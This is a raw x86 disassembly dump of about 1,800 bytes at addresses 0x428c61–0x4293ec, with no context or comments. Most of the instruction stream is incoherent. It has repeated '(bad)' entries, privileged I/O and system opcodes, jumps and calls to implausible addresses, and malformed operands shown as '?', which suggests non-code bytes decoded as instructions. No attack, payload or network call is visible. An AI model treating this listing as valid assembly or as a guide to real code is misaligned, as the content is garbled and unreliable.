  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
